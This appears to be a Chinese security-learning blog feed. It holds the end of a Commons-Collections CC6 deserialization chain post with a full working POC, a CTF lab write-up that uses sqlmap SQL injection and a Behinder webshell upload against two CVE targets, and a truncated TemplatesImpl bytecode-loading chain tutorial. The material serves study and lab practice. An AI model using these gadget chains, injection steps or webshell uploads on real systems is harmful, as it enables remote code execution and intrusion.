java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-type">int</span> h;<br>    <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们只需要给hashMap传入TiedMapEntry这个key就能让他触发链子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">ct</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazymap</span> <span class="hljs-operator">=</span> LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(), ct);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, <span class="hljs-string">&quot;1&quot;</span>);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashmap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashmap.put(entry, <span class="hljs-string">&quot;1&quot;</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>这里触发链子是因为put函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> V <span class="hljs-title function_">put</span><span class="hljs-params">(K key, V value)</span> &#123;<br>        <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>他会执行hash方法然后hashcode所以这一步是需要调整的，不然在序列化之前他就已经执行了链子</p><h2 id="第三步：调整利用链"><a href="#第三步：调整利用链" class="headerlink" title="第三步：调整利用链"></a>第三步：调整利用链</h2><p>由于HashMap的put方法会导致提前调用hash方法，从而在序列化前就命令执行，所以这里修改一下代码。</p><p>这里选择在新建LazyMap对象的时候，随便传入一个Transformer对象，等put完之后再通过反射修改回ChainedTransformer对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">ct</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazymap</span> <span class="hljs-operator">=</span> LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;1&quot;</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, <span class="hljs-string">&quot;1&quot;</span>);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashmap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashmap.put(entry, <span class="hljs-string">&quot;1&quot;</span>);<br>        Class&lt;LazyMap&gt; clazz = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(lazymap, ct);<br>        serialize(hashmap);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>但是运行发现这样无法弹出计算器，原因出在LazyMap的get方法处，由于put函数会先触发一次hashCode到get</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;<br>        <span class="hljs-comment">// create value for key if key is not currently in the map</span><br>        <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> factory.transform(key);<br>            map.put(key, value);<br>            <span class="hljs-keyword">return</span> value;<br>        &#125;<br>        <span class="hljs-keyword">return</span> map.get(key);<br>    &#125;<br></code></pre></td></tr></table></figure><p>这导致此时map.containKey(key)不为空，所以不会执行transform</p><p>因此我们要在给hashMap赋值后手动删除LazyMap的这个Key</p><p><img src="/./../img/JavaCc/CC6-3.png"></p><p>此时在运行就能触发整条链子弹出内容</p><h2 id="完整POC"><a href="#完整POC" class="headerlink" title="完整POC"></a>完整POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">ct</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazymap</span> <span class="hljs-operator">=</span> LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;1&quot;</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, <span class="hljs-string">&quot;1&quot;</span>);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashmap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashmap.put(entry, <span class="hljs-string">&quot;1&quot;</span>);<br>        lazymap.remove(<span class="hljs-string">&quot;1&quot;</span>);<br>        Class&lt;LazyMap&gt; clazz = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(lazymap, ct);<br>        serialize(hashmap);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./ser.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="额外内容"><a href="#额外内容" class="headerlink" title="额外内容"></a>额外内容</h2><p>上一次提到TemplateImpl链子需要触发newTransformer方法，正好InvokerTransformer能够触发任意方法</p><p>我们可以将Transform列表中的内容修改为之前提到的TemplatesImpl链子从而让他加载字节码触发恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>,<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>)<br>       &#125;;<br><br>       ChainedTransformer chainedTransformer=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>春秋云镜Day1</title>
    <link href="/2025/03/30/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"/>
    <url>/2025/03/30/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/</url>
    
    <content type="html"><![CDATA[<h1 id="春秋云镜靶机集合"><a href="#春秋云镜靶机集合" class="headerlink" title="春秋云镜靶机集合"></a>春秋云镜靶机集合</h1><h2 id="CVE-2022-28512"><a href="#CVE-2022-28512" class="headerlink" title="CVE-2022-28512"></a>CVE-2022-28512</h2><p>靶标介绍：<br>Fantastic Blog (CMS)是一个绝对出色的博客&#x2F;文章网络内容管理系统。它使您可以轻松地管理您的网站或博客，它为您提供了广泛的功能来定制您的博客以满足您的需求。它具有强大的功能，您无需接触任何代码即可启动并运行您的博客。 该CMS的&#x2F;single.php路径下，id参数存在一个SQL注入漏洞。</p><p><img src="/./../img/ChunQiu/CVE-2022-28512/CVE-2022-28512-1.png"></p><p><img src="/./../img/ChunQiu/CVE-2022-28512/CVE-2022-28512-2.png"></p><p>该网站是一个博客网站，通过URL可以发现一个<strong>id</strong>传参,尝试是否存在sql注入</p><img src="./../img/ChunQiu/CVE-2022-28512/CVE-2022-28512-3.png" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs URL">http://eci-2ze0l1ibdu5c9ncsh2ku.cloudeci1.ichunqiu.com/single.php?id=4&#x27;<br></code></pre></td></tr></table></figure><p>加入引号时出现报错</p><p><img src="/./../img/ChunQiu/CVE-2022-28512/CVE-2022-28512-4.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://eci-2ze0l1ibdu5c9ncsh2ku.cloudeci1.ichunqiu.com/single.php?<span class="hljs-built_in">id</span>=4<span class="hljs-string">&#x27;--+</span><br></code></pre></td></tr></table></figure><p>加上注释符恢复正常，可以判断存在sql注入，sqlmap梭哈</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://eci-2ze0l1ibdu5c9ncsh2ku.cloudeci1.ichunqiu.com/single.php?id=5&quot;</span> <span class="hljs-attr">--dbs</span><br></code></pre></td></tr></table></figure><p><img src="/./../img/ChunQiu/CVE-2022-28512/CVE-2022-28512-5.png"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://eci-2ze0l1ibdu5c9ncsh2ku.cloudeci1.ichunqiu.com/single.php?id=5&quot;</span> -d <span class="hljs-string">&quot;ctf&quot;</span> <span class="hljs-attr">--tables</span><br></code></pre></td></tr></table></figure><p><img src="/./../img/ChunQiu/CVE-2022-28512/CVE-2022-28512-6.png"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://eci-2ze0l1ibdu5c9ncsh2ku.cloudeci1.ichunqiu.com/single.php?id=5&quot;</span> -D <span class="hljs-string">&quot;ctf&quot;</span> -T <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-attr">--dump</span><br></code></pre></td></tr></table></figure><p>成功读取flag</p><p><img src="/./../img/ChunQiu/CVE-2022-28512/CVE-2022-28512-7.png"></p><hr><h2 id="CVE-2022-28525"><a href="#CVE-2022-28525" class="headerlink" title="CVE-2022-28525"></a>CVE-2022-28525</h2><p>ED01-CMS v20180505 存在任意文件上传漏洞</p><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-1.png"></p><p>进来发现是一个博客网站，具体内容无法查看，但是登陆页面是真实存在的</p><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-2.png"></p><p>尝试用admin注册，显示已经被注册</p><p>其他用户名却无法注册，显示数据库错误，那么只能尝试弱口令看看能不能登陆admin</p><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-3.png"></p><p>使用admin&#x2F;admin成功登陆管理员页面</p><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-4.png"></p><p>首先分析一下这个管理页面</p><h3 id="Posts页面"><a href="#Posts页面" class="headerlink" title="Posts页面"></a>Posts页面</h3><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-5.png"></p><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-6.png"></p><h3 id="Comments页面"><a href="#Comments页面" class="headerlink" title="Comments页面"></a>Comments页面</h3><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-7.png"></p><h3 id="Categories页面"><a href="#Categories页面" class="headerlink" title="Categories页面"></a>Categories页面</h3><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-8.png"></p><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-9.png"></p><h3 id="Users页面"><a href="#Users页面" class="headerlink" title="Users页面"></a>Users页面</h3><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-10.png"></p><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-9.png"></p><h3 id="Profile页面"><a href="#Profile页面" class="headerlink" title="Profile页面"></a>Profile页面</h3><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-11.png"></p><h3 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h3><h4 id="Post"><a href="#Post" class="headerlink" title="Post"></a>Post</h4><p>首先在Posts页面罗列了所有网页上的post，并且提供了添加Post页面，但是尝试后发现这个功能无法正常使用</p><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-12.png"></p><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-13.png"></p><h4 id="Comments"><a href="#Comments" class="headerlink" title="Comments"></a>Comments</h4><p>该页面只能删除评论，无法对其进行修改，没发现什么可以利用的点。</p><h4 id="Category"><a href="#Category" class="headerlink" title="Category"></a>Category</h4><p>该页面可以修改Category的Title值，尝试发现存在XSS漏洞</p><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-14.png"></p><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-15.png"></p><h4 id="Users"><a href="#Users" class="headerlink" title="Users"></a>Users</h4><p>该页面可以看到所有的用户，并对他们的信息进行修改</p><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-16.png"></p><p>在新增用户的页面，发现一个上传点，尝试是否存在文件上传漏洞</p><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-17.png"></p><p>上传冰蝎马</p><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-18.png"></p><p>提示上传成功，我们回到所有用户页面</p><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-19.png"></p><p>可以看到新用户已经在列表中，我们文件上传的木马对应的应该是头像，我们复制头像链接</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>eci-<span class="hljs-number">2</span>zed1u4xg1v7ietz9tk4.cloudeci1.ichunqiu.com<span class="hljs-regexp">/images/</span>shell.php<br></code></pre></td></tr></table></figure><p>连接冰蝎马</p><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-20.png"></p><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-21.png"></p><p>连接成功，获取flag即可</p><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-22.png"></p>]]></content>
    
    
    <categories>
      
      <category>春秋云镜</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>TemplatesImpl类中的调用链</title>
    <link href="/2025/03/29/TemplatesImpl%E7%B1%BB%E4%B8%AD%E7%9A%84%E8%B0%83%E7%94%A8%E9%93%BE/"/>
    <url>/2025/03/29/TemplatesImpl%E7%B1%BB%E4%B8%AD%E7%9A%84%E8%B0%83%E7%94%A8%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>TemplatesImpl利用链是一个非常重要的东西，要知道，CC链可以用它，CB链也用它，注入内存马还是用它。为什么？因为它可以加载java字节码并实例化。相对于调用Runtime.exec进行命令执行，加载恶意代码更贴合我们的使用。</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs leaf">调用链的基本过程，反序列化中可以用例如CC链中的任意方法调用来触发这条链子<br>TemplatesImpl<span class="hljs-punctuation">#</span><span class="hljs-keyword">newTransformer</span><span class="hljs-params">()</span> -&gt;<br>        TemplatesImpl<span class="hljs-punctuation">#</span><span class="hljs-keyword">getTransletInstance</span><span class="hljs-params">()</span> -&gt;<br>            TemplatesImpl<span class="hljs-punctuation">#</span><span class="hljs-keyword">defineTransletClasses</span><span class="hljs-params">()</span>-&gt;<br>                TransletClassLoader<span class="hljs-punctuation">#</span><span class="hljs-keyword">defineClass</span><span class="hljs-params">()</span>-&gt;<br></code></pre></td></tr></table></figure><h2 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h2><p>ClassLoader，类加载器，是JVM执行类加载机制的前提，其主要任务为根据一个类的全限定名来读取此类的二进制字节流到JVM内部，然后转换为一个与目标类对应的java.lang.Class对象实例。</p><h2 id="defineClass加载器"><a href="#defineClass加载器" class="headerlink" title="defineClass加载器"></a>defineClass加载器</h2><p>对于我们利用漏洞简单的来说，就是ClassLoader中的defineClass加载器能过获取我们给他的字节码从而读取成类，在这个过程中若这个字节码对应的类中存放有恶意内容就可以触发</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stata">ClassPool pool = ClassPool.getDefault();<br>pool.insertClassPath(new ClassClassPath(AbstractTranslet.<span class="hljs-keyword">class</span>));<br>CtClass <span class="hljs-keyword">cc</span> = pool.makeClass(<span class="hljs-string">&quot;Test&quot;</span>);<span class="hljs-comment">//创造类</span><br><span class="hljs-keyword">cc</span>.setSuperclass(pool.<span class="hljs-built_in">get</span>(AbstractTranslet.<span class="hljs-keyword">class</span>.getName()));<span class="hljs-comment">//设置父类</span><br>CtConstructor constructor = <span class="hljs-keyword">cc</span>.makeClassInitializer();<span class="hljs-comment">//创造空的构造函数</span><br>constructor.insertBefore(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;</span>calc\<span class="hljs-string">&quot;);&quot;</span>);<span class="hljs-comment">//插入静态代码块</span><br>byte[] bytes=<span class="hljs-keyword">cc</span>.toBytecode();<span class="hljs-comment">//转换成字节码</span><br><br>这里用javassist类创造一个带有static代码块运行后会触发计算器的恶意类(Javaassist 就是一个用来 处理 Java 字节码的<br>类库。它可以在一个已经编译好的类中添加新的方法，或者是修改已<br>有的方法，并且不需要对字节码方面有深入的了解。同时也可以去生<br>成一个新的类对象，通过完全手动的方式。)<br></code></pre></td></tr></table></figure><h2 id="触发链过程"><a href="#触发链过程" class="headerlink" title="触发链过程"></a>触发链过程</h2><p>我们最终的目标是要触发defineClass加载器<br><img src="/../img/TemplatesImpl/defineclass.png" alt="defineclass"><br>但是classloader类中他是protected型，我们需要找到能调用他的方法，我们寻找所有使用defineclass方法的地方<br><img src="/../img/TemplatesImpl/defineclass2.png" alt="defineclass"><br>在TemplatesImpl中的内置类TransletClassLoader(CLassLoader的子类)中找到，继续寻找调用它defineclass方法的地方</p><p><img src="/../img/TemplatesImpl/defineclass3.png" alt="defineclass"><br>在这个类的defineTransletClasses中调用了他，继续找谁调用了defineTransletClasses<br><img src="/../img/TemplatesImpl/defineclass4.png" alt="defineclass"><br>getTransletInstance方法调用了defineTransletClasses<br><img src="/../img/TemplatesImpl/defineclass5.png" alt="defineclass"><br>但是注意_class值不能为null</p><p>最后便是newTransformer调用了getTransletInstance<br><img src="/../img/TemplatesImpl/defineclass6.png" alt="defineclass"></p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs haxe">TemplatesImpl obj=<span class="hljs-keyword">new</span> <span class="hljs-type">TemplatesImpl</span>();<br>setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-type">byte</span>[][]&#123;bytes&#125;);<span class="hljs-comment">//恶意类字节码</span><br>setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<span class="hljs-comment">//该值任意</span><br>setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-type">TransformerFactoryImpl</span>());<span class="hljs-comment">//必须为TransformerFactoryImpl实例</span><br>obj.<span class="hljs-keyword">new</span><span 